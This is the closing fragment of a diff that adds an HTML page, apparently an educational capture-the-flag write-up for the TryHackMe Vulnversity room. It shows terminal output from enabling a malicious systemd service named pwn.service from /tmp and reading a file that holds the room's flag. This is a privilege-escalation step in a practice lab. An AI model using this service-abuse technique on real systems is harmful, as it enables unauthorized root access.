+Created symlink /etc/systemd/system/multi-user.target.wants/pwn.service -&gt; /tmp/pwn.service.
+$ cat /tmp/output.txt
+a58ff8579f0a9270368d33a9966c7fd5
+$ 
+</code></pre>
+<p>おわり</p>
+    </article>
+  </main>
+
+  <footer>
+    <p>Educational CTF writeup for <a href="https://tryhackme.com/room/vulnversity">https://tryhackme.com/room/vulnversity</a></p>
+  </footer>
+</body>
+</html>
